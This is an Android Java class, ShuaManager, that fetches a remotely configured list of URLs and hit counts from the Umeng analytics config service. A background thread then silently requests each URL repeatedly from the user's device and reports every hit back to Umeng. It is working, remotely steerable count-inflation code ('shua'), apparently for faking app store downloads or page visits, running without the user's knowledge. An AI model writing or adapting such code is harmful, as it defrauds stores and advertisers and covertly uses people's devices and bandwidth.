package com.sar.gp;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.text.TextUtils;
import android.util.Log;

import com.umeng.analytics.MobclickAgent;
import com.umeng.analytics.onlineconfig.UmengOnlineConfigureListener;

/**
 * [{"count":1,"url":"http...","name":"360_101"},...]
 * 
 * @author Administrator
 * 
 */
public class ShuaManager {
	private SharedPreferences sp;
	private ShuaThread thd;
	private Context context;
	private static ShuaManager _inst;

	private ShuaManager() {
	}

	public static ShuaManager getInstance() {
		if (null == _inst)
			_inst = new ShuaManager();
		return _inst;
	}

	public void init(Context context) {
		if (null != sp)
			return;
		this.context = context;
		sp = context.getSharedPreferences("shua", Context.MODE_PRIVATE);
	}

	public void start() {
		if (null != thd)
			return;
		String js = getUmeng();
		if (TextUtils.isEmpty(js))
			return;
		JSONArray arr;
		try {
			arr = new JSONArray(js);
			start_shua(arr);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	private String getUmeng() {
		String version = getVersionCode();
		String key = "shua";
		if (!TextUtils.isEmpty(version)) {
			key = key + "_" + version;
		}
		String js = MobclickAgent.getConfigParams(context, key);
		if (TextUtils.isEmpty(js)) js = MobclickAgent.getConfigParams(context, "shua");
		return js;
	}

	private String getVersionCode() {
		PackageManager packageManager = this.context.getPackageManager();
		PackageInfo packInfo;
		try {
			packInfo = packageManager.getPackageInfo(
					this.context.getPackageName(), 0);
			String version = String.valueOf(packInfo.versionCode);
			return version;
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		return "";
	}

	private void start_shua(JSONArray objs) {
		if (null == objs || objs.length() == 0)
			return;
		thd = new ShuaThread(objs);
		thd.start();
	}

	private class ShuaThread extends Thread {
		private JSONArray objs;

		public ShuaThread(JSONArray objs) {
			this.objs = objs;
		}

		@Override
		public void run() {
			for (int i = 0; i < objs.length(); i++) {
				try {
					JSONObject obj = objs.getJSONObject(i);
					int count = obj.getInt("count");
					String url = obj.getString("url");
					for (int j = 0; j < count; j++) {
						if (!check_need(obj)) {
							Agmrsk.i("not need shua again: " + url);
							continue;
						}
						shua(url);
						notify_shua(obj);
						Thread.sleep(3000);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			super.run();
			thd = null;
		}

		private void shua(String url_str) throws Exception {
			URL url = new URL(url_str);
			InputStream inputStream = null;
			HttpURLConnection connection = null;
			try {
				connection = (HttpURLConnection) url.openConnection();
				inputStream = connection.getInputStream();
				byte[] buff = new byte[16];
				inputStream.read(buff);
				Agmrsk.i("shua ok: " + url_str);
			} finally {
				if (connection != null) {
					connection.disconnect();
				}
				if (inputStream != null) {
					inputStream.close();
				}
			}
		}

		private void notify_shua(JSONObject obj) throws JSONException {
			String name = obj.getString("name");
			int shua_count = sp.getInt(name, 0);
			sp.edit().putInt(name, shua_count + 1).commit();
			HashMap<String, String> data = new HashMap<String, String>();
			data.put("name", name);
			data.put("version", getVersionCode());
			MobclickAgent.onEvent(context, "shua", data);
			Agmrsk.i("notify umeng shua");
		}

		private boolean check_need(JSONObject obj) throws JSONException {
			String name = obj.getString("name");
			int shua_count = sp.getInt(name, 0);
			int count = obj.getInt("count");
			if (shua_count >= count)
				return false;
			return true;
		}
	}
}
